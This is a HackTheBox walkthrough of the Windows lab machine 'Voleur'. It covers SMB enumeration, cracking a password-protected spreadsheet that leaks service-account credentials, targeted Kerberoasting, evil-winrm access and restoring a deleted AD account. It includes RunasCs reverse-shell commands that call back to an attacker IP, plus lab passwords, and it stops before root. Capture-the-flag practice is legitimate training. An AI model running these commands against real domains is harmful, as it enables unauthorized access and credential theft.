---
title: "Voleur"
date: 2025-07-05
retire_date: 9999-09-09
tags: ["htb", "Windows", "Hard", "Assume Breach"]
difficulty: "Hard"
base_points: 40
event: "HackTheBox"
Author: ""
cover:
  image: "/images/ctf/htb/machines.jpg"
  alt: "Voleur Machine"
  relative: true
---

{{< machine-info-shortcode >}}

## Walkthrough

Hard - Windows

A Kerberos-only domain (NTLM is disabled), so every step rides on tickets. We loot an encrypted spreadsheet from a share, targeted-Kerberoast our way to WinRM, then restore a tombstoned user to push toward Administrator.

Assume-breach creds:

```
ryan.naylor
HollowOct31Nyt
```

## Enum

List the shares we can reach with our foothold creds:

```bash
smbclient -L 10.129.101.107 -U "ryan.naylor%HollowOct31Nyt"
```
`smbclient -L` enumerates the available SMB shares on the DC.

Pull the domain user list — handy later for the deleted account:

```bash
nxc smb voleur.htb -u users -p pass --users
```
`nxc ... --users` lists every domain account.

{{< figure src="/images/ctf/htb/Pasted image 20250705160426.png" alt="domain users" caption=" " align="center" >}}

Because NTLM is off, we add `-k` to force Kerberos for share enumeration:

```bash
nxc smb DC.voleur.htb -u 'ryan.naylor' -p HollowOct31Nyt --shares -k
```
`-k` tells NetExec to authenticate with Kerberos instead of NTLM.

{{< figure src="/images/ctf/htb/Pasted image 20250705160506.png" alt="shares" caption=" " align="center" >}}

Spider the interesting `IT` share to see what files live there:

```bash
nxc smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k -M spider_plus
```
The `spider_plus` module recursively lists/downloads files across the share.

{{< figure src="/images/ctf/htb/Pasted image 20250705161023.png" alt="spider results" caption=" " align="center" >}}

{{< figure src="/images/ctf/htb/Pasted image 20250705161042.png" alt="spider results 2" caption=" " align="center" >}}

### Getting the xlsx

Grab the spreadsheet over a Kerberos-authenticated SMB session:

```bash
smbclient //dc.voleur.htb/IT --use-kerberos=required -k
```
`--use-kerberos=required` forces ticket-based auth (no NTLM fallback).

{{< figure src="/images/ctf/htb/Pasted image 20250705162412.png" alt="xlsx download" caption=" " align="center" >}}

The file is password-protected, so we crack it:

{{< figure src="/images/ctf/htb/Pasted image 20250705162548.png" alt="cracking xlsx" caption=" " align="center" >}}

### Open the spreadsheet

Decrypt with the cracked password and convert to CSV to read it:

```
pip3 install msoffcrypto-tool xlsx2csv
msoffcrypto-tool Access_Review.xlsx decrypted.xlsx -p football1
xlsx2csv decrypted.xlsx output.csv
cat output.csv
```
`msoffcrypto-tool` removes the Office encryption using the password `football1`, then `xlsx2csv` flattens it to readable CSV.

{{< figure src="/images/ctf/htb/Pasted image 20250705163054.png" alt="csv content" caption=" " align="center" >}}

It leaks two service-account credentials:

```
voleur.htb\svc_ldap : M1XyC9pW7qT5Vn
voleur.htb\svc_iis  : N5pXyW1VqM7CZ8
```

{{< figure src="/images/ctf/htb/Pasted image 20250705163245.png" alt="service creds" caption=" " align="center" >}}

## user.txt

### WinRM hash

Request a TGT for `svc_ldap`, then targeted-Kerberoast the accounts it can write SPNs on:

```bash
impacket-getTGT 'voleur.htb/svc_ldap:M1XyC9pW7qT5Vn'

KRB5CCNAME=svc_ldap.ccache

python3 targetedKerberoast/targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
```
`impacket-getTGT` caches a Kerberos ticket; `targetedKerberoast -k` then uses it to set SPNs and pull roastable hashes.

{{< figure src="/images/ctf/htb/Pasted image 20250705165349.png" alt="kerberoast hashes" caption=" " align="center" >}}

{{< figure src="/images/ctf/htb/Pasted image 20250705165406.png" alt="cracked" caption=" " align="center" >}}

Cracking those yields the `svc_winrm` password.

### evil-winrm access

Since there's no NTLM, we authenticate to WinRM with a ticket rather than a hash:

```bash
impacket-getTGT 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi'

KRB5CCNAME=svc_winrm.ccache

evil-winrm -i DC.voleur.htb -r voleur.htb
```
`evil-winrm -r voleur.htb` uses the cached Kerberos ticket (realm) instead of a password/hash.

{{< figure src="/images/ctf/htb/Pasted image 20250705165548.png" alt="winrm shell" caption=" " align="center" >}}

## root.txt

### Finding todd

Drop to an `svc_ldap` shell with RunasCs so we can query AD:

```powershell
.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.14.60:4444
```
`RunasCs` launches a process as another user and sends a reverse shell back to us.

The earlier user list hinted at a deleted account — confirm `todd.wolfe` is tombstoned:

```powershell
Get-ADObject -Filter 'SamAccountName -eq "todd.wolfe"' -IncludeDeletedObjects
```
`-IncludeDeletedObjects` surfaces tombstoned objects so we can read the GUID.

Restore it from the tombstone:

```powershell
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
```
`Restore-ADObject` un-deletes `todd.wolfe`, bringing the account back as a usable principal.

{{< figure src="/images/ctf/htb/Pasted image 20250705175823.png" alt="todd restored" caption=" " align="center" >}}

With the account back, we pivot into it and continue toward Administrator:

```powershell
.\RunasCs.exe todd.wolfe NightT1meP1dg3on14 cmd.exe -r 10.10.14.60:4444
```
Spawns a shell as `todd.wolfe`, the next link in the chain.

{{<seperator>}}
